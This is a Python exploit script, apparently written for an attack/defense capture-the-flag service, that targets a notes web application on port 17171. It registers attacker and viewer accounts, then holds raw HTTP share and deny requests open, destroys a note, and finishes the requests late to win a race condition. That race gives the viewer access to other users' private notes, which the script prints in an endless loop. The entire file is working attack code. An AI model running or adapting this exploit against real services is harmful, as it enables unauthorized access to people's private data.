#!/usr/bin/env python3

import sys
import json
import random
import string
import itertools
from typing import Self, List, Coroutine

import asyncio
import aiohttp


IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = 17171

TOKEN_HEADER_NAME = 'X-Token'


def random_string(length: int, alpha: str = string.ascii_lowercase + string.digits) -> str:
    symbols = random.choices(alpha, k = length)

    return ''.join(symbols)


class Client:
    def __init__(self: Self) -> None:
        self.url = f'http://{IP}:{PORT}'
        self.token = 'x'
        self.username = 'x'
        self.password = 'x'

    async def register(self: Self) -> None:
        self.username = random_string(16)
        self.password = random_string(32)

        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + '/users/register',
                json = {
                    'name': self.username,
                    'password': self.password,
                },
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()
                self.token = response.headers.get(TOKEN_HEADER_NAME)
    
    async def note_get(self: Self, title: str) -> str:
        async with aiohttp.ClientSession() as session:
            request = session.get(
                self.url + f'/notes/{title}',
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                return await response.text()

    async def note_create(self: Self) -> str:
        note_title = random_string(16)
        note_content = random_string(32)

        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + '/notes',
                json = {
                    'title': note_title,
                    'content': note_content,
                    'visible': False,
                },
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()

        return note_title
    
    async def note_destroy(self: Self, title: str) -> None:
        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + f'/notes/{title}/destroy',
                json = {},
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()

    async def user_profile(self: Self, name: str) -> str:
        async with aiohttp.ClientSession() as session:
            request = session.get(
                self.url + f'/users/profile/{name}',
                json = {},
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                return await response.text()


async def do_attack(
        wait: int, attacker: Client, viewer: Client, timeout: int,
) -> None:
    await asyncio.sleep(wait)

    note_title = await attacker.note_create()

    obj = {
        'viewer': viewer.username,
    }
    data = json.dumps(obj).encode()

    _, writer1 = await asyncio.open_connection(IP, PORT)

    writer1.write(f'POST /notes/{note_title}/share HTTP/1.1\r\n'.encode())
    writer1.write(f'Host: {IP}:{PORT}\r\n'.encode())
    writer1.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
    writer1.write(f'Content-Length: {len(data)}\r\n'.encode())
    writer1.write(b'Content-Type: application/json\r\n')
    writer1.write(b'\r\n')
    await writer1.drain()

    _, writer2 = await asyncio.open_connection(IP, PORT)

    writer2.write(f'POST /notes/{note_title}/deny HTTP/1.1\r\n'.encode())
    writer2.write(f'Host: {IP}:{PORT}\r\n'.encode())
    writer2.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
    writer2.write(f'Content-Length: {len(data)}\r\n'.encode())
    writer2.write(b'Content-Type: application/json\r\n')
    writer2.write(b'\r\n')
    await writer2.drain()

    # await asyncio.sleep(0.1)

    await attacker.note_destroy(note_title)

    await asyncio.sleep(timeout)

    writer1.write(data)
    await writer1.drain()

    writer1.close()

    obj = await viewer.user_profile(viewer.username)
    user = json.loads(obj)

    for shared_note in user['sharedNotes']:
        note = await viewer.note_get(shared_note)
        print(note)

    writer2.write(data)
    await writer2.drain()

    writer2.close()


async def main() -> None:
    count = 5
    timeout = 10

    attacker = Client()
    await attacker.register()
    print(f'registered attacker with name: {attacker.username}')

    viewer = Client()
    await viewer.register()
    print(f'registered viewer with name: {viewer.username}')

    for i in itertools.count():
        print(f'started {i} round with {count} attacks')

        attacks: List[Coroutine] = []

        for i in range(count):
            attack = do_attack(i, attacker, viewer, timeout)
            attacks.append(attack)

        await asyncio.gather(*attacks)


if __name__ == '__main__':
    asyncio.run(main())
